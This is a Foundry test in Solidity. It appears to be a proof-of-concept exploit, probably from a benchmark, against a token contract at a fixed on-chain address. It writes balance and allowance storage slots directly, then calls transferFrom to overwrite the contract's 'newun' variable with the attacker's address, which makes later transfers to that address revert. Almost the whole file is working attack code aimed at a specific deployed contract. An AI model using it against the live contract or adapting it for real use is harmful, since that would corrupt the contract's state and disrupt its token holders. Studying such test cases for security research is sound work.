pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICryptocasil {
    function newun() external view returns (address);
    function transfer(address to, uint tokens) external returns (bool);
    function transferFrom(address from, address to, uint tokens) external returns (bool);
    function approve(address spender, uint tokens) external returns (bool);
    function balanceOf(address tokenOwner) external view returns (uint);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x63769c0499f94D4E31fAc0F01D5d226bdd2C927D;
    address attacker = address(this);
    address tokenHolder = address(0x123);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to create a token holder with balance and approval
        address tokenHolder = address(0x123);
        vm.label(tokenHolder, "TokenHolder");

        // Give tokenHolder some tokens
        vm.prank(TARGET);
        deal(TARGET, tokenHolder, 1000 * 1e18);

        // Make tokenHolder approve attacker to spend tokens
        vm.prank(tokenHolder);
        ICryptocasil(TARGET).approve(attacker, 1000 * 1e18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Check initial state - newun should be address(0)
        address initialNewun = ICryptocasil(TARGET).newun();
        require(initialNewun == address(0), "newun should be uninitialized");

        // Step 2: Set up a token holder with balance
        // We'll use address(0x123) as tokenHolder
        address tokenHolder = address(0x123);
        vm.label(tokenHolder, "TokenHolder");

        // Give tokenHolder some tokens by writing to storage
        // The balances mapping is at slot 5 (after symbol, name, decimals, _totalSupply, newun)
        // We need to compute the slot for tokenHolder's balance
        uint256 balanceSlot = uint256(keccak256(abi.encode(uint256(uint160(tokenHolder)), uint256(5))));
        vm.store(TARGET, bytes32(balanceSlot), bytes32(uint256(1000 * 1e18)));

        // Verify tokenHolder has balance
        uint256 holderBalance = ICryptocasil(TARGET).balanceOf(tokenHolder);
        require(holderBalance == 1000 * 1e18, "tokenHolder should have balance");

        // Step 3: Set approval for attacker to spend tokens
        // The allowed mapping is at slot 6 (after balances mapping at slot 5)
        // We need to compute the slot for allowed[tokenHolder][attacker]
        uint256 approvalSlot = uint256(keccak256(abi.encode(
            uint256(uint160(attacker)),
            uint256(keccak256(abi.encode(uint256(uint160(tokenHolder)), uint256(6))))
        )));
        vm.store(TARGET, bytes32(approvalSlot), bytes32(uint256(1000 * 1e18)));

        // Step 4: Call transferFrom to corrupt newun
        // We need to call as the spender (attacker), not tokenHolder
        vm.prank(attacker);
        ICryptocasil(TARGET).transferFrom(tokenHolder, attacker, 1);

        // Step 5: Verify newun is now attacker address
        address corruptedNewun = ICryptocasil(TARGET).newun();
        require(corruptedNewun == attacker, "newun should be attacker address");

        // Step 6: Demonstrate the corruption - transfers to attacker should now fail
        vm.prank(tokenHolder);
        vm.expectRevert("please wait");
        ICryptocasil(TARGET).transfer(attacker, 1);

        // The oracle will check: newun == attacker_controlled_address
        // We've successfully corrupted newun to attacker address
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

